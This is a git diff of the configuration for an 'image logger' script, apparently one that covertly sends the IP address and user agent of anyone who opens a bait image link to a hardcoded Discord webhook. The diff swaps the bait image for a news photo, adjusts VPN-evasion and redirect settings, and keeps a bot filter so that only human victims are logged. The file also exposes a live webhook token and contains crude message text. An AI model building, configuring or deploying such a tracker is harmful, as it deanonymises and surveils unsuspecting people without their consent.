@@ -13,9 +13,7 @@ __author__ = "ALUBALIBALI"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1335558225692463124/N8UL3FVP12SJITgxLvkaBiqXm1ULRz-iXOBs7-PF91cL7Izdio7D7yjtdHNb7jJGiR-m",
-    "image": "uar link ",# You can also have a custom image by using a URL argument
-    "link": "https://www.youtube.com/watch?v=RAZSdO2DA3E&list=RDRAZSdO2DA3E&index=1",
-    
+    "image": "https://media.npr.org/assets/img/2015/09/23/ap_836720500193-d90a20e2b8d735f74d436f36054eb3dc2bd96696.jpg?s=1100&c=85&f=jpeg.jpg",# You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -31,10 +29,10 @@ config = {
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
         "message": "by_samxara run pusssssssssssssssssssssssy", # Message to show
-        "richMessage": False, # Enable rich text? (See README for more info)
+        "richMessage": True, # Enable rich text? (See README for more info)
     },
 
-    "vpnCheck": 2, # Prevents VPNs from triggering the alert
+    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                 # 0 = No Anti-VPN
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
@@ -52,9 +50,10 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": True, # Redirect to a webpage?
-        "page": "https://www.youtube.com/watch?v=RAZSdO2DA3E&list=RDRAZSdO2DA3E&index=1" # Link to the webpage to redirect to 
+        "redirect": False, # Redirect to a webpage?
+        "page": "https://your-link.here" # Link to the webpage to redirect to 
     },
+
 
     # Please enter all values in correct format. Otherwise, it may break.
     # Do not edit anything below this, unless you know what you're doing.
@@ -67,7 +66,6 @@ config = {
 
 blacklistedIPs = () # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                            # This feature is undocumented mainly due to it being for detecting bots better.
-
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
         return "Discord"
@@ -207,7 +205,7 @@ margin: 0;
 padding: 0;
 }}
 div.img {{
-background-image: url('{url}');
+background-image: url({url});
 background-position: center center;
 background-repeat: no-repeat;
 background-size: contain;
